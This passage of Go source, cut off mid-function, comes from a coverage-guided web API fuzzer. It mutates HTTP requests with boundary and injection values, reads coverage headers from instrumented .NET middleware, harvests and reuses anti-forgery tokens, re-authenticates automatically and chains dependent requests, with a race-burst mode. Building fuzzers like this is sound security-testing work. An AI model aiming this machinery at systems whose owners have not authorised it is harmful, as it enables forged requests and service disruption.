func (f *Fuzzer) havocDepth(mode string) int {
	if mode != "havoc" {
		return 1
	}
	return clampInt(1+f.stallCounter/8, 1, 4)
}

func (f *Fuzzer) renderTemplate(templateID int, mutateMode string, havocDepth int, seedIdx int) (WorkItem, error) {
	t := f.tmplByID[templateID]
	if t == nil {
		return WorkItem{}, fmt.Errorf("template not found: %d", templateID)
	}
	customKeys := make([]string, 0, 8)
	dynKeys := make([]string, 0, 8)
	for _, s := range t.Segments {
		if s.Kind == "custom_payload" && s.PayloadKey != "" {
			customKeys = append(customKeys, s.PayloadKey)
		}
		if s.Kind == "dynamic" {
			dynKeys = append(dynKeys, inferDependencyKeys(s.Name)...)
		}
	}
	corrKeys := append([]string{}, customKeys...)
	corrKeys = append(corrKeys, dynKeys...)
	corr := f.runtime.pickCorrelated(corrKeys)
	useCorr := len(corr) > 0
	if useCorr && (mutateMode == "mutate" || mutateMode == "havoc") && rand.Float64() < 0.20 {
		useCorr = false
	}

	var b strings.Builder
	mutParts := make([]string, 0, 8)
	for _, s := range t.Segments {
		switch s.Kind {
		case "static":
			b.WriteString(s.Value)
		case "custom_payload":
			val := s.Default
			if useCorr {
				if cv, ok := corr[s.PayloadKey]; ok {
					val = cv
					mutParts = append(mutParts, "corr_"+s.PayloadKey)
				}
			}
			if val == "" || strings.HasPrefix(val, "CUSTOM_PAYLOAD") {
				val = f.runtime.pickCustomPayloadValue(s.PayloadKey, f.dict, s.Default)
				mutParts = append(mutParts, "dict_"+s.PayloadKey)
			}
			if mutateMode == "mutate" && rand.Float64() < 0.15 {
				val, _ = mutateAny(val, "string")
				mutParts = append(mutParts, "mutate_string")
			} else if mutateMode == "havoc" && rand.Float64() < 0.30 {
				val, _ = mutateHavoc(val, "string", havocDepth)
				mutParts = append(mutParts, "havoc_string")
			}
			if s.Quoted {
				b.WriteByte('"')
				b.WriteString(val)
				b.WriteByte('"')
			} else {
				b.WriteString(val)
			}
		case "fuzzable":
			val := s.Default
			if mutateMode == "mutate" {
				if rand.Float64() > 0.40 {
					var name string
					val, name = mutateAny(val, s.ValueType)
					mutParts = append(mutParts, name)
				}
			} else if mutateMode == "havoc" {
				var name string
				val, name = mutateHavoc(val, s.ValueType, havocDepth)
				mutParts = append(mutParts, name)
			}
			if s.Quoted {
				b.WriteByte('"')
				b.WriteString(val)
				b.WriteByte('"')
			} else {
				b.WriteString(val)
			}
		case "dynamic":
			v, m := f.runtime.pickDynamic(s.Name, f.dict)
			b.WriteString(v)
			if m != "" {
				mutParts = append(mutParts, m)
			}
		default:
			b.WriteString(s.Value)
		}
	}
	raw := b.String()
	method, path, headers, body, err := parseRawRequest(raw)
	if err != nil {
		return WorkItem{}, err
	}
	if ap, labels := f.adaptPathParamsFromRuntime(t, path); ap != path {
		path = ap
		mutParts = append(mutParts, labels...)
	}
	if f.shouldForceForm(method, path) {
		if ah, ab, ok := adaptJSONRequestToForm(headers, body); ok {
			headers = ah
			body = ab
			mutParts = append(mutParts, "adapt_form")
		}
	}
	if (mutateMode == "mutate" || mutateMode == "havoc") && (method == "POST" || method == "PUT" || method == "PATCH") {
		chance := 0.15
		if mutateMode == "havoc" {
			chance = 0.30
		}
		if rand.Float64() < chance {
			if mb, label := mutateJSONBody(body, havocDepth); label != "" {
				body = mb
				mutParts = append(mutParts, label)
			}
		}
	}
	// Path parameter mutation: replace ID-like segments with boundary/injection values.
	// 15% chance in mutate mode, 25% in havoc mode.
	if mutateMode == "mutate" || mutateMode == "havoc" {
		pathMutChance := 0.15
		if mutateMode == "havoc" {
			pathMutChance = 0.25
		}
		if rand.Float64() < pathMutChance {
			if mutatedPath, pathLabel := mutatePath(path); mutatedPath != "" {
				path = mutatedPath
				mutParts = append(mutParts, pathLabel)
			}
		}
	}
	mutParts = dedupStrings(mutParts)
	label := "seed"
	if len(mutParts) > 0 {
		label = strings.Join(mutParts, "+")
	}
	mname := "seed"
	if len(mutParts) > 0 {
		mname = mutParts[0]
	}
	return WorkItem{
		TemplateID:    templateID,
		Method:        method,
		Path:          path,
		Headers:       headers,
		Body:          body,
		Raw:           raw,
		MutationLabel: label,
		MutationName:  mname,
		SeedIdx:       seedIdx,
		SeqDepth:      0,
	}, nil
}

func parseRawRequest(raw string) (string, string, map[string]string, string, error) {
	sep := "\r\n\r\n"
	i := strings.Index(raw, sep)
	if i < 0 {
		sep = "\n\n"
		i = strings.Index(raw, sep)
		if i < 0 {
			return "", "", nil, "", errors.New("invalid raw request: missing header/body separator")
		}
	}
	hdrPart := raw[:i]
	body := raw[i+len(sep):]
	lines := splitLines(hdrPart)
	if len(lines) == 0 {
		return "", "", nil, body, errors.New("empty request line")
	}
	rq := strings.Fields(strings.TrimSpace(lines[0]))
	if len(rq) < 2 {
		return "", "", nil, body, errors.New("invalid request line")
	}
	method := strings.ToUpper(strings.TrimSpace(rq[0]))
	path := strings.TrimSpace(rq[1])
	headers := map[string]string{}
	for _, line := range lines[1:] {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		p := strings.Index(line, ":")
		if p < 0 {
			continue
		}
		k := strings.TrimSpace(line[:p])
		v := strings.TrimSpace(line[p+1:])
		headers[k] = v
	}
	return method, path, headers, body, nil
}

func (f *Fuzzer) prepareItemForSend(item WorkItem) WorkItem {
	if !f.cfg.AutoAntiForgery {
		return item
	}
	if !isWriteMethod(item.Method) || isAPILikePath(item.Path) {
		return item
	}
	ct := canonicalContentType(item.Headers)
	if !isFormLikeContentType(ct) {
		return item
	}
	token := f.pickAntiForgeryToken()
	if token == "" {
		return item
	}
	if strings.TrimSpace(getHeaderCI(item.Headers, f.cfg.AntiForgeryHeader)) == "" {
		setHeaderCI(item.Headers, f.cfg.AntiForgeryHeader, token)
	}
	if strings.Contains(strings.ToLower(ct), "application/x-www-form-urlencoded") {
		if body, changed := upsertFormField(item.Body, f.cfg.AntiForgeryField, token); changed {
			item.Body = body
		}
	}
	return item
}

func (f *Fuzzer) pickAntiForgeryToken() string {
	now := time.Now()
	ttl := time.Duration(math.Max(0.0, f.cfg.AntiForgeryTokenTTL) * float64(time.Second))
	cands := make([]string, 0, 64)
	f.antiForgeryMu.RLock()
	for tok, ts := range f.antiForgeryTokens {
		if ttl > 0 && now.Sub(ts) > ttl {
			continue
		}
		cands = append(cands, tok)
	}
	f.antiForgeryMu.RUnlock()
	if len(cands) > 0 {
		return cands[rand.Intn(len(cands))]
	}

	// Backward-compat fallback.
	cands = f.runtime.valuesForKey(f.cfg.AntiForgeryField)
	if len(cands) == 0 {
		cands = f.runtime.valuesForKey(f.cfg.AntiForgeryHeader)
	}
	if len(cands) == 0 {
		cands = f.runtime.valuesForKey("antiforgery")
	}
	if len(cands) == 0 {
		return ""
	}
	return cands[rand.Intn(len(cands))]
}

func (f *Fuzzer) pruneAntiForgeryTokens(now time.Time) {
	if !f.cfg.AutoAntiForgery {
		return
	}
	if !f.antiForgeryLastPrune.IsZero() && now.Sub(f.antiForgeryLastPrune) < 2*time.Second {
		return
	}
	ttl := time.Duration(math.Max(0.0, f.cfg.AntiForgeryTokenTTL) * float64(time.Second))
	if ttl <= 0 {
		f.antiForgeryLastPrune = now
		return
	}
	f.antiForgeryMu.Lock()
	for tok, ts := range f.antiForgeryTokens {
		if now.Sub(ts) > ttl {
			delete(f.antiForgeryTokens, tok)
		}
	}
	f.antiForgeryMu.Unlock()
	f.antiForgeryLastPrune = now
}

func (f *Fuzzer) registerAntiForgeryToken(token string, now time.Time) bool {
	tok := normalizeValue(token)
	if !isUsefulValue(tok) {
		return false
	}
	f.pruneAntiForgeryTokens(now)
	f.antiForgeryMu.Lock()
	defer f.antiForgeryMu.Unlock()
	if _, ok := f.antiForgeryTokens[tok]; ok {
		f.antiForgeryTokens[tok] = now
		return false
	}
	maxTok := maxInt(1, f.cfg.AntiForgeryMaxTokens)
	if len(f.antiForgeryTokens) >= maxTok {
		var oldestKey string
		var oldestTS time.Time
		for k, ts := range f.antiForgeryTokens {
			if oldestKey == "" || ts.Before(oldestTS) {
				oldestKey = k
				oldestTS = ts
			}
		}
		if oldestKey != "" {
			delete(f.antiForgeryTokens, oldestKey)
		}
	}
	f.antiForgeryTokens[tok] = now
	_ = f.runtime.addValue(f.cfg.AntiForgeryField, tok)
	_ = f.runtime.addValue(f.cfg.AntiForgeryHeader, tok)
	_ = f.runtime.addValue("antiforgery", tok)
	return true
}

func (f *Fuzzer) antiForgeryTokenPoolSize() int {
	f.antiForgeryMu.RLock()
	defer f.antiForgeryMu.RUnlock()
	return len(f.antiForgeryTokens)
}

func (f *Fuzzer) sendOne(item WorkItem) SendResult {
	return f.sendOneWithClient(item, f.client)
}

func (f *Fuzzer) sendOneWithClient(item WorkItem, httpClient *http.Client) SendResult {
	if httpClient == nil {
		httpClient = f.client
	}
	t0 := time.Now()
	item = f.prepareItemForSend(item)
	u := f.target + item.Path
	var bodyReader io.Reader
	if (item.Method == "POST" || item.Method == "PUT" || item.Method == "PATCH" || item.Method == "DELETE") && strings.TrimSpace(item.Body) != "" {
		bodyReader = strings.NewReader(item.Body)
	}
	req, err := http.NewRequest(item.Method, u, bodyReader)
	if err != nil {
		return SendResult{Item: item, Err: err, Latency: time.Since(t0)}
	}
	for k, v := range item.Headers {
		if strings.EqualFold(k, "Host") || strings.EqualFold(k, "Content-Length") || strings.EqualFold(k, "Transfer-Encoding") {
			continue
		}
		req.Header.Set(k, v)
	}
	// Per-request coverage attribution: the .NET middleware reads this header and
	// returns X-Coverage-Delta / X-Exception-Type in the response — zero extra round-trips.
	requestID := atomic.AddUint64(&f.requestIDSeq, 1)
	req.Header.Set("X-Fuzz-Request-Id", "fz-"+strconv.FormatUint(requestID, 36))
	idHeaders, idToken := f.identityAuth(item.Identity)
	for k, v := range idHeaders {
		if strings.EqualFold(k, "Host") || strings.EqualFold(k, "Content-Length") || strings.EqualFold(k, "Transfer-Encoding") {
			continue
		}
		if strings.TrimSpace(req.Header.Get(k)) == "" {
			req.Header.Set(k, v)
		}
	}
	if idToken != "" {
		req.Header.Set("Authorization", "Bearer "+idToken)
	} else if f.token != "" {
		req.Header.Set("Authorization", "Bearer "+f.token)
	}

	resp, err := httpClient.Do(req)
	if err != nil {
		return SendResult{Item: item, Err: err, Latency: time.Since(t0)}
	}
	defer resp.Body.Close()

	maxBytes := int64(0)
	s := resp.StatusCode
	switch {
	case s >= 200 && s < 300:
		maxBytes = int64(maxInt(1024, f.cfg.MaxResponseBytes))
	case s >= 500:
		maxBytes = int64(minInt(maxInt(8192, f.cfg.MaxResponseBytes), 1<<20))
	case s >= 400 && s < 500:
		maxBytes = 4096
	default:
		maxBytes = 0
	}
	body := ""
	if maxBytes > 0 {
		buf, _ := io.ReadAll(io.LimitReader(resp.Body, maxBytes))
		body = sanitizeText(string(buf), maxInt(1024, f.cfg.MaxResponseBytes))
	}
	headers := map[string]string{}
	for k, vals := range resp.Header {
		if len(vals) > 0 {
			headers[k] = vals[0]
		}
	}
	// Extract per-request coverage delta and exception type from response headers.
	coverageDelta := 0
	if v := headers["X-Coverage-Delta"]; v != "" {
		if n, err2 := strconv.Atoi(v); err2 == nil && n > 0 {
			coverageDelta = n
		}
	}
	exceptionType := headers["X-Exception-Type"]
	// Fallback: if the header wasn't set (ASP.NET Core exception handler runs above our middleware
	// and sets HasStarted=true before our finally can add headers), extract the exception class
	// from the response body. In Development mode ASP.NET returns full stack traces.
	if exceptionType == "" && resp.StatusCode >= 500 {
		exceptionType = extractExceptionType(body)
	}
	return SendResult{
		Item:          item,
		Status:        resp.StatusCode,
		Body:          body,
		Headers:       headers,
		Latency:       time.Since(t0),
		CoverageDelta: coverageDelta,
		ExceptionType: exceptionType,
	}
}

func (f *Fuzzer) handleResult(res SendResult) {
	if res.Err != nil {
		f.totalErrors++
		return
	}
	f.totalDone++
	f.latencySamples++
	f.latencyTotalMS += float64(res.Latency.Milliseconds())
	f.completedSinceCV++

	edgeShare := 0
	// Prefer per-request delta from X-Coverage-Delta response header (exact attribution).
	// Fall back to interval poll when header is absent (e.g. non-instrumented or HTTP-only targets).
	if res.CoverageDelta > 0 {
		f.currentEdges += res.CoverageDelta
		edgeShare = res.CoverageDelta
		f.stallCounter = 0
		f.completedSinceCV = 0
	} else if f.completedSinceCV >= maxInt(1, f.cfg.CoverageInterval) {
		after, err := f.coverage.GetEdges()
		if err == nil {
			delta := after - f.currentEdges
			if delta > 0 {
				f.currentEdges = after
				edgeShare = maxInt(1, delta)
				f.stallCounter = 0
			} else {
				f.stallCounter++
			}
		}
		f.completedSinceCV = 0
	}

	ep := f.ensureEndpointStats(res.Item.Method, res.Item.Path)
	ep.Reqs++
	ep.LastSeen = f.totalDone
	switch {
	case res.Status >= 200 && res.Status < 300:
		ep.S2xx++
	case res.Status == 401 || res.Status == 403:
		ep.S401403++
	case res.Status >= 400 && res.Status < 500:
		ep.S4xx++
	case res.Status >= 500:
		ep.S5xx++
		if res.Status == 500 {
			ep.S500++
		}
	}
	if edgeShare > 0 {
		ep.NewEdges += edgeShare
		ep.ReqsSinceEdge = 0
	} else {
		ep.ReqsSinceEdge++
	}
	epKey := endpointKey(res.Item.Method, ep.Path)
	f.maybeAddRequestSample(res)
	if f.cfg.AutoAntiForgery {
		if gained := f.learnAntiForgeryFromResponse(res.Item.Path, res.Status, res.Headers, res.Body, false); gained > 0 {
			f.antiForgeryLearned += gained
		}
	}

	isFormMismatch := f.cfg.AdaptiveContentType && isFormContentTypeMismatch(res.Status, res.Body)
	if f.cfg.AdaptiveContentType && isWriteMethod(res.Item.Method) {
		if isFormMismatch && !isAPILikePath(res.Item.Path) {
			if _, ok := f.forceFormEndpoints[epKey]; !ok {
				f.forceFormEndpoints[epKey] = struct{}{}
				f.addEvent(fmt.Sprintf("ADAPT content-type -> form  %s %s", res.Item.Method, truncate(normalizePath(res.Item.Path), 60)))
			}
		}
		if res.Status == http.StatusUnsupportedMediaType {
			if _, ok := f.forceFormEndpoints[epKey]; ok {
				delete(f.forceFormEndpoints, epKey)
				f.addEvent(fmt.Sprintf("ADAPT content-type -> json  %s %s", res.Item.Method, truncate(normalizePath(res.Item.Path), 60)))
			}
		}
	}

	ms := f.ensureMutationStats(res.Item.MutationName)
	ms.Attempts++
	recordMutationCategoryAttempt(res.Item.MutationLabel)
	if edgeShare > 0 {
		ms.NewEdges += edgeShare
		recordMutationCategoryHit(res.Item.MutationLabel)
		f.addOrBoostSeed(res.Item, edgeShare)
		if edgeShare >= 3 || f.lastEdgeEvent.IsZero() || time.Since(f.lastEdgeEvent) > 5*time.Second {
			f.addEvent(fmt.Sprintf("NEW EDGE +%d  %s %s  %s", edgeShare, res.Item.Method, truncate(normalizePath(res.Item.Path), 60), truncate(res.Item.MutationName, 28)))
			f.lastEdgeEvent = time.Now()
		}
	}

	if res.Status >= 500 {
		if !isFormMismatch {
			f.recordCrash(res)
			ep.Logged5xx++
			if res.Status == 500 {
				ep.Logged500++
			}
		} else {
			ep.Filtered5xx++
			if res.Status == 500 {
				ep.Filtered500++
			}
			f.recordClientErrorSample(res.Item.Method, ep.Path, res.Status, res.Body)
		}
		if f.cfg.SkipOnCrash {
			f.removeActiveTemplate(res.Item.TemplateID)
		}
		if f.cfg.SkipEndpointOn500 && res.Status == 500 {
			if removed := f.blockEndpointByTemplateID(res.Item.TemplateID); removed > 0 {
				f.addEvent(fmt.Sprintf("BLOCK 500 endpoint %s %s removed_templates=%d", res.Item.Method, truncate(normalizePath(res.Item.Path), 60), removed))
			}
		}
	} else if res.Status == 401 || res.Status == 403 {
		f.recordAuthFailure(res.Item.Method, ep.Path, res.Status, res.Body)
		f.recordClientErrorSample(res.Item.Method, ep.Path, res.Status, res.Body)
		// Auto re-authenticate when a token has expired (persistent 401 stream on any endpoint).
		// Threshold of 9 avoids hammering auth on the very first 401; 30s cooldown prevents tight loops.
		if st := f.authBlocked[endpointKey(res.Item.Method, ep.Path)]; st != nil && st.Count == 9 {
			if time.Since(f.lastAuthRefresh) > 30*time.Second {
				f.lastAuthRefresh = time.Now()
				if err := f.authenticate(); err == nil {
					f.addEvent("Re-authenticated after 401 stream (token refreshed)")
				}
			}
		}
	} else if res.Status >= 400 && res.Status < 500 {
		if f.cfg.AutoAntiForgery && f.shouldHarvestAntiForgery(res) {
			if normPath, ok := f.reserveAntiForgeryHarvest(res.Item.Path); ok {
				go func(path string) {
					if learned := f.harvestAntiForgeryForPathReserved(path); learned > 0 {
						f.harvestMu.Lock()
						f.antiForgeryLearned += learned
						f.harvestMu.Unlock()
					}
				}(normPath)
			}
		}
		f.recordClientErrorSample(res.Item.Method, ep.Path, res.Status, res.Body)
	}

	if res.Status >= 200 && res.Status < 300 {
		f.recordAuthSuccess(res.Item.Method, ep.Path)
		learned := 0
		if f.shouldLearnFromSuccess(res) {
			learnReq := f.learnFromRequestContext(res.Item.Path, res.Item.Body)
			learnResp := f.learnFromResponse(res.Body, res.Headers)
			learned = learnReq + learnResp
		}
		if learned > 0 {
			f.learnedByEndpoint[epKey] += learned
		}
		if f.shouldEnqueueSequence(res, learned) {
			if n := f.enqueueSequenceFollowups(res.Item, res.Body, res.Headers); n > 0 {
				// no-op, queue updated
			}
		}
		if learned == 0 && (res.Item.Method == "POST" || res.Item.Method == "PUT" || res.Item.Method == "PATCH") {
			// Writes are valuable for dependency chains, keep occasional light learning.
			if f.learnSampleCounter%5 == 0 {
				if v := f.learnFromResponse(res.Body, res.Headers); v > 0 {
					f.learnedByEndpoint[epKey] += v
				}
			}
		}
		if f.cfg.RaceMode {
			f.enqueueRaceBurst(res.Item)
		}
	}
	if !f.coverageSaturationWarned {
		if sat := f.coverageSaturationPct(); sat >= 98.0 && f.coverageCapacity > 0 {
			f.coverageSaturationWarned = true
			f.addEvent(fmt.Sprintf("COVERAGE near saturation %.1f%% (%d/%d)", sat, f.currentEdges, f.coverageCapacity))
		}
	}

	// Coverage stagnation: if no new edges in 5 minutes, aggressively boost under-explored
	// endpoints by resetting their request counters. This forces the sampler to re-distribute
	// weight away from exhausted endpoints toward fresh ones.
	if !f.lastEdgeEvent.IsZero() && time.Since(f.lastEdgeEvent) > 5*time.Minute {
		boosted := 0
		for k, ep := range f.endpointStats {
			if ep.Reqs > 200 && ep.NewEdges == 0 && ep.ReqsSinceEdge > 100 {
				ep.ReqsSinceEdge = ep.Reqs + 1000
				f.endpointStats[k] = ep
			}
			if ep.Reqs < 50 || (ep.NewEdges > 0 && ep.ReqsSinceEdge > 50) {
				ep.ReqsSinceEdge = 0
				f.endpointStats[k] = ep
				boosted++
			}
		}
		if boosted > 0 {
			f.addEvent(fmt.Sprintf("STAGNATION boost: refreshed %d endpoint weights (no edges for 5min)", boosted))
		}
		f.lastEdgeEvent = time.Now()
	}

	// When the bitmap is > 85% full, coverage feedback becomes noise (hash collisions dominate).
	// Periodically reset so the fuzzer can still distinguish new paths — especially important
	// for runs > 30 minutes against large applications.
	if sat := f.coverageSaturationPct(); sat > 85.0 && f.coverageCapacity > 0 {
		if f.lastCoverageReset.IsZero() || time.Since(f.lastCoverageReset) > 90*time.Second {
			if err := f.coverage.Reset(); err == nil {
				f.addEvent(fmt.Sprintf("COVERAGE bitmap reset (sat=%.1f%% → 0%%)", sat))
				f.currentEdges = 0
				f.coverageSaturationWarned = false
				f.lastCoverageReset = time.Now()
			}
		}
	}
}

func (f *Fuzzer) coverageSaturationPct() float64 {
	if f.coverageCapacity <= 0 {
		return 0
	}
	return clampFloat((float64(f.currentEdges)/math.Max(1.0, float64(f.coverageCapacity)))*100.0, 0.0, 100.0)
}

func (f *Fuzzer) addOrBoostSeed(item WorkItem, newEdges int) {
	if f.isTemplateBlocked(item.TemplateID) {
		return
	}
	// Surprise factor: discovering edges on a heavily-fuzzed endpoint is more
	// valuable than on a fresh one — it means we reached new code territory.
	// Mirrors AFL++'s rare-branch favoring: log2(requests) scaling.
	surprise := 1.0
	epKey := endpointKey(item.Method, normalizeEndpointPath(item.Path))
	if ep := f.endpointStats[epKey]; ep != nil && ep.Reqs > 1 {
		surprise = 1.0 + math.Log2(float64(ep.Reqs))
		if ep.NewEdges == 0 {
			surprise *= 3.0
		}
	}
	if item.SeedIdx >= 0 && item.SeedIdx < len(f.corpus) {
		f.corpus[item.SeedIdx].EdgesFound += newEdges
		f.corpus[item.SeedIdx].Energy += float64(newEdges) * 5.0 * surprise
		f.seedSampler.Set(item.SeedIdx, f.corpus[item.SeedIdx].Energy)
	}
	seed := Seed{
		TemplateID:   item.TemplateID,
		Payload:      item.Raw,
		EdgesFound:   newEdges,
		Energy:       math.Max(1.0, float64(newEdges)*surprise),
		MutationName: item.MutationName,
	}
	f.corpus = append(f.corpus, seed)
	f.seedSampler.Append(seed.Energy)

	// Corpus minimization: prune exhausted seeds to prevent unbounded growth.
	// Keeps the Fenwick sampler healthy and focuses energy on seeds that still find edges.
	if len(f.corpus) > 500 {
		f.minimizeCorpus()
	}
}

// minimizeCorpus removes seeds with energy below threshold or that have been chosen
// many times without finding new edges. Rebuilds the Fenwick sampler from scratch.
func (f *Fuzzer) minimizeCorpus() {
	const maxCorpus = 400
	const minEnergy = 0.3
	const maxChosenNoEdge = 80
	kept := make([]Seed, 0, maxCorpus)
	for _, s := range f.corpus {
		if s.Energy < minEnergy && s.TimesChosen > maxChosenNoEdge && s.EdgesFound == 0 {
			continue
		}
		kept = append(kept, s)
	}
	// If pruning wasn't aggressive enough, sort by energy and keep top maxCorpus.
	if len(kept) > maxCorpus {
		sort.Slice(kept, func(i, j int) bool { return kept[i].Energy > kept[j].Energy })
		kept = kept[:maxCorpus]
	}
	f.corpus = kept
	// Rebuild Fenwick sampler to match new corpus slice.
	f.seedSampler = NewFenwickSampler()
	for _, s := range f.corpus {
		f.seedSampler.Append(math.Max(0.01, s.Energy))
	}
}

func (f *Fuzzer) enqueueSequenceFollowups(source WorkItem, respBody string, respHeaders map[string]string) int {
	if source.SeqDepth >= maxInt(1, f.cfg.SequenceMaxDepth) {
		return 0
	}
	info := f.depIndex[source.TemplateID]
	producedDeps := mapKeys(info.Writes)
	producedIDKeys := mapKeys(info.IDWrites)
	entityIDs := extractEntityIDs(respBody, respHeaders)
	if rid := inferResourceIDKeyFromPath(source.Path); rid != "" {
		for _, eid := range entityIDs {
			_ = f.runtime.addValue(rid, eid)
			_ = f.runtime.addValue("id", eid)
		}
	}

	// Bind known write dependencies to discovered entity IDs.
	if len(entityIDs) > 0 {
		for _, dep := range producedDeps {
			f.runtime.addDepValue(dep, entityIDs[0])
		}
	}

	if len(producedDeps) == 0 && len(entityIDs) == 0 {
		meta := f.meta[source.TemplateID]
		if meta.Method != "POST" && meta.Method != "PUT" && meta.Method != "PATCH" {
			return 0
		}
	}

	followups := f.findFollowups(source.TemplateID, source.Method, normalizePath(source.Path), producedDeps, producedIDKeys)
	if len(followups) == 0 {
		return 0
	}
	fanout := minInt(maxInt(1, f.cfg.SequenceFanout), len(followups))
	enqueued := 0
	for _, tid := range followups[:fanout] {
		mode := "none"
		if rand.Float64() >= 0.75 {
			mode = "mutate"
		}
		item, err := f.renderTemplate(tid, mode, 1, -1)
		if err != nil {
			continue
		}
		if len(entityIDs) > 0 && strings.Contains(item.Path, "{") {
			item.Path = rePathParam.ReplaceAllString(item.Path, entityIDs[0])
		}
		item.SeqDepth = source.SeqDepth + 1
		item.EpochName = "Sequence"
		item.EpochIdx = source.EpochIdx
		item.Identity = source.Identity
		seqLabel := fmt.Sprintf("sequence(d%d:%s %s->%s)", item.SeqDepth, source.Method, normalizePath(source.Path), item.Method)
		if item.MutationLabel != "seed" {
			seqLabel += "+" + item.MutationLabel
		}
		item.MutationLabel = seqLabel
		item.MutationName = "sequence"
		item.Trace = f.extendTrace(source.Trace, item)

		if len(f.sequenceQueue) >= sequenceQueueMax {
			f.sequenceQueue = f.sequenceQueue[1:]
		}
		f.sequenceQueue = append(f.sequenceQueue, item)
		enqueued++
	}
	return enqueued
}

func (f *Fuzzer) findFollowups(sourceID int, sourceMethod, sourceNorm string, producedDeps, producedIDKeys []string) []int {
	seen := map[int]struct{}{}
	out := make([]int, 0, 16)
	for _, dep := range producedDeps {
		for _, tid := range f.depConsumers[dep] {
			if tid == sourceID {
				continue
			}
			if f.isTemplateBlocked(tid) {
				continue
			}
			if _, ok := seen[tid]; ok {
				continue
			}
			seen[tid] = struct{}{}
			out = append(out, tid)
		}
	}
	for _, idk := range producedIDKeys {
		for _, tid := range f.idConsumers[canonicalKey(idk)] {
			if tid == sourceID {
				continue
			}
			if f.isTemplateBlocked(tid) {
				continue
			}
			if _, ok := seen[tid]; ok {
				continue
			}
			seen[tid] = struct{}{}
			out = append(out, tid)
		}
	}
	for _, tid := range f.activeIDs {
		if tid == sourceID {
			continue
		}
		if f.isTemplateBlocked(tid) {
			continue
		}
		if _, ok := seen[tid]; ok {
			continue
		}
		m := f.meta[tid]
		sameFamily := m.Norm == sourceNorm || strings.HasPrefix(m.Norm, sourceNorm+"/") || strings.HasPrefix(sourceNorm, m.Norm+"/")
		if !sameFamily {
			continue
		}
		if m.Method == sourceMethod && m.Norm == sourceNorm {
			continue
		}
		seen[tid] = struct{}{}
		out = append(out, tid)
	}

	sort.SliceStable(out, func(i, j int) bool {
		a := f.meta[out[i]]
		b := f.meta[out[j]]
		return followupPriority(sourceMethod, sourceNorm, a.Method, a.Norm) < followupPriority(sourceMethod, sourceNorm, b.Method, b.Norm)
	})
	return out
}

func followupPriority(sourceMethod, sourceNorm, candMethod, candNorm string) int {
	s := strings.ToUpper(sourceMethod)
	c := strings.ToUpper(candMethod)
	score := 100
	if s == "POST" {
		switch c {
		case "GET":
			score -= 40
		case "PUT", "PATCH":
			score -= 25
		case "DELETE":
			score -= 12
		}
	} else if s == "PUT" || s == "PATCH" {
		switch c {
		case "GET":
			score -= 35
		case "DELETE":
			score -= 18
		}
	} else if s == "GET" {
		switch c {
		case "PUT", "PATCH":
			score -= 20
		case "DELETE":
			score -= 10
		}
	}
	if candNorm == sourceNorm && c == "GET" {
		score -= 8
	}
	if len(candNorm) > len(sourceNorm) {
		score -= 5
	}
	if strings.Contains(candNorm, "{") && strings.Contains(candNorm, "}") {
		score -= 3
	}
	return score
}

func (f *Fuzzer) learnFromRequestContext(path, body string) int {
	learned := 0
	vals := make([][2]string, 0, 32)
	rels := make([][4]string, 0, 64)

	pathVals := extractPathTokens(path)
	vals = append(vals, pathVals...)
	if rid := inferResourceIDKeyFromPath(path); rid != "" && len(pathVals) > 0 {
		vals = append(vals, [2]string{rid, pathVals[len(pathVals)-1][1]})
	}

	bodyVals := make([][2]string, 0, 32)
	bodyRels := make([][4]string, 0, 64)
	if reJSONStartAny.MatchString(body) {
		var js any
		if err := json.Unmarshal([]byte(body), &js); err == nil {
			extractJSONRuntimeValues(js, &bodyVals, &bodyRels, 0)
		}
	} else if strings.Contains(body, "=") {
		if valsQ, err := url.ParseQuery(body); err == nil {
			for k, arr := range valsQ {
				if strings.TrimSpace(k) == "" || len(arr) == 0 {
					continue
				}
				v := normalizeValue(arr[0])
				if !isUsefulValue(v) {
					continue
				}
				bodyVals = append(bodyVals, [2]string{k, v})
			}
		}
	}
	vals = append(vals, bodyVals...)
	rels = append(rels, bodyRels...)

	pathIDs := filterIDLikePairs(pathVals)
	bodyIDs := filterIDLikePairs(bodyVals)
	for i := 0; i < minInt(8, len(pathIDs)); i++ {
		for j := 0; j < minInt(12, len(bodyIDs)); j++ {
			rels = append(rels, [4]string{pathIDs[i][0], pathIDs[i][1], bodyIDs[j][0], bodyIDs[j][1]})
		}
	}

	for _, kv := range vals {
		if f.runtime.addValue(kv[0], kv[1]) {
			learned++
		}
	}
	for _, rr := range rels {
		if f.runtime.addRelation(rr[0], rr[1], rr[2], rr[3]) {
			learned++
		}
	}
	return learned
}

func (f *Fuzzer) learnFromResponse(body string, headers map[string]string) int {
	learned := 0
	vals := make([][2]string, 0, 32)
	rels := make([][4]string, 0, 64)

	location := headers["Location"]
	if location == "" {
		location = headers["location"]
	}
	if location != "" {
		if u, err := url.Parse(location); err == nil {
			vals = append(vals, extractPathTokens(u.Path)...)
		} else {
			vals = append(vals, extractPathTokens(location)...)
		}
	}

	if reJSONStartAny.MatchString(body) {
		var js any
		if err := json.Unmarshal([]byte(body), &js); err == nil {
			extractJSONRuntimeValues(js, &vals, &rels, 0)
		}
	}
	for _, kv := range vals {
		if f.runtime.addValue(kv[0], kv[1]) {
			learned++
		}
	}
	for _, rr := range rels {
		if f.runtime.addRelation(rr[0], rr[1], rr[2], rr[3]) {
			learned++
		}
	}
	return learned
}

func (f *Fuzzer) learnAntiForgeryFromResponse(path string, status int, headers map[string]string, body string, forced bool) int {
	if !f.cfg.AutoAntiForgery {
		return 0
	}
	if status < 200 || status >= 400 {
		return 0
	}
	if !forced && f.cfg.AntiForgerySampleRate < 1.0 {
		if rand.Float64() > clampFloat(f.cfg.AntiForgerySampleRate, 0.0, 1.0) {
			return 0
		}
	}
	ct := strings.ToLower(strings.TrimSpace(getHeaderCI(headers, "Content-Type")))
	lowBody := strings.ToLower(body)
	if !strings.Contains(ct, "text/html") && !strings.Contains(lowBody, "__requestverificationtoken") && !strings.Contains(lowBody, "requestverificationtoken") {
		return 0
	}
	f.pruneAntiForgeryTokens(time.Now())
	if !forced {
		f.antiForgeryMu.RLock()
		known := len(f.antiForgeryTokens)
		f.antiForgeryMu.RUnlock()
		if known >= maxInt(1, f.cfg.AntiForgeryMaxTokens) {
			return 0
		}
	}
	tokens := extractAntiForgeryTokens(body, f.cfg.AntiForgeryField)
	if len(tokens) == 0 {
		return 0
	}
	learned := 0
	now := time.Now()
	for _, tok := range tokens {
		if f.registerAntiForgeryToken(tok, now) {
			learned++
		}
	}
	if learned > 0 {
